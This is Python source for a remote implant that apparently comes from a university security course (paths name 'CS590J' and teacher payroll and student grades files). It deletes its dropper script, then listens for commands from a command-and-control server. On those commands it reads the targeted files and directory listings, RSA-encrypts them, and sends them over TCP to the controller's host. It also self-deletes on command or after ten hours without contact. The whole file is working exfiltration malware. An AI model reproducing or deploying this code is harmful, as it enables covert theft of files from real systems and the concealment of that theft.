import os
from os import remove
from sys import argv
import requests
import socket
import sys
import rsa
import time
import argparse

# get the target ip address from command line input
parser = argparse.ArgumentParser()
parser.add_argument('rhost', required=False)

args = parser.parse_args()

RHOST = args.rhost
if RHOST is None:
    RHOST = 'localhost'

print("Implant Running")

#Remove evidence of script.bat from the start
try:
    os.remove("script.bat")
except:
    print("Batch file already gone")

#Add the paths to paths.txt
with open('Paths.txt', 'w') as f:
    f.write('C:\\Users\\CS590J\\Desktop\\Teacher Files\\Payroll.txt\n')
    f.write('C:\\Users\\CS590J\\Desktop\\Student Files\\Grades.txt\n')
    f.close()

#function returns the command recieved by the victim implant listener
def recieve_command():
    connection, client_address = implant_socket.accept()
    try:
        #Recieves and prints the data
        while True:
            data = connection.recv(1500)
            if data:
                return(data)
            
    finally:
        # Clean up the connection
        print("Connection Closed")
        connection.close()

#function sends data passed to it to the c2
def send_exfil(data):
    try:
        # Send data
        print('sending:', data)
        c2_socket.sendall(data)
    
    except:
        print("Error")

#function to self destruct
def self_destruct():
    try:
        os.remove("Paths.txt")
    except:
        print("Paths file already gone")
    remove(argv[0])
    sys.exit(0)

#Dead man's switch to auto delete after 10 hours of running with no contact from the C2
def check_time(start_time):
    if(start_time == 0):
        start_time = round(time.time() * 1000)
    cur_millis = round(time.time() * 1000)
    #delete after 10 hr running
    if(cur_millis - start_time > 36000000):
        self_destruct



# Create a TCP/IP socket for the victim implant
implant_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# Bind the socket to the port 10000 and listen
implant_server_address = ('localhost', 10000)
implant_socket.bind(implant_server_address)
implant_socket.listen(1)

start_time = 0
while(True):
    #dead man's switch
    check_time(start_time)

    #recieve the command from the c2
    command = recieve_command().decode("utf-8")
    print("Recieved Command: ", command)
    #command is always the first part of the message
    comm = command.split(";")[0]

    #append to paths
    if(comm == "2a"):
        #reset dead man's switch
        start_time = 0
        param = command.split(";")[1]
        file1 = open('Paths.txt', 'r')
        Lines = file1.readlines()
        file1.close()
        with open('Paths.txt', 'w') as f:
            for line in Lines:
                f.write(line)
            f.write(param + "\n")
            f.close()

    #exfil paths
    if(comm == "2e"):
        #reset dead man's switch
        start_time = 0
        #Paths.txt contains the areas we are interested in exfiltrating
        file1 = open('Paths.txt', 'r')
        #Line by line each path
        Lines = file1.readlines()
        file1.close()

        # Create a TCP/IP socket
        c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect the socket to the port where the server is listening
        c2_server_address = (RHOST, 9999)
        print("Connecting to Socket")
        c2_socket.connect(c2_server_address)

        #rsa key construction
        n = int(command.split(";")[1])
        e = int(command.split(";")[2])
        pubkey = rsa.PublicKey(n,e)
        
        #for each file in the exfil paths
        for line in Lines:
            #exfil the file for each location in Lines
            cur_file = open(line.replace("\n", ""), 'r')
            cur_file_lines = cur_file.readlines()
            #encrypt the content before sending it back
            file_title = "------" + line.replace("\n", "") + "------\n"
            enc = rsa.encrypt(file_title.encode('utf8'), pubkey)
            send_exfil(enc)
            #for each line of the file we are interested in
            for c in cur_file_lines:
                #encrypt the content before sending it back
                enc = rsa.encrypt(c.encode('utf8'), pubkey)
                send_exfil(enc)
                #prevents the overlapping of decrypt outputs in C2
                time.sleep(0.3)
            #close the file
            cur_file.close()
            
        #attempt to close socket
        try:
            print("Closing Socket")
            c2_socket.close()
        
        #in case of error
        except:
            print("error")
    
    #Perform oswalk on specified directory
    if(comm == "2w"):
        #reset dead man's switch
        start_time = 0
        # Create a TCP/IP socket
        c2_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Connect the socket to the port where the server is listening
        c2_server_address = ('localhost', 9999)
        print("Connecting to Socket")
        c2_socket.connect(c2_server_address)

        #directory of interest
        directory = command.split(";")[1]

        #rsa key construction
        n = int(command.split(";")[2])
        e = int(command.split(";")[3])
        pubkey = rsa.PublicKey(n,e)
        
        #directory, subdirectories, files in that directory = oswalk
        _, directory_walk, file_walk = next(os.walk(directory))

        #send the section title
        enc = rsa.encrypt('-----Files-----'.encode('utf8'), pubkey)
        send_exfil(enc)
        time.sleep(0.3)

        #send each file in the walk
        for w in file_walk:
            #encrypt the content before sending it back
            enc = rsa.encrypt(w.encode('utf8'), pubkey)
            send_exfil(enc)
            time.sleep(0.3)
        
        #Send the section title
        enc = rsa.encrypt('-----Immediate Subdirectories-----'.encode('utf8'), pubkey)
        send_exfil(enc)
        time.sleep(0.3)

        #send each subdirectory to the folder
        for w in directory_walk:
            #encrypt the content before sending it back
            enc = rsa.encrypt(w.encode('utf8'), pubkey)
            send_exfil(enc)
            time.sleep(0.3)
            
        #attempt to close socket
        try:
            print("Closing Socket")
            c2_socket.close()
        
        #in case of error
        except:
            print("error")

    #self destruct
    if(comm == "1"):
        #self destruct
        self_destruct()
        
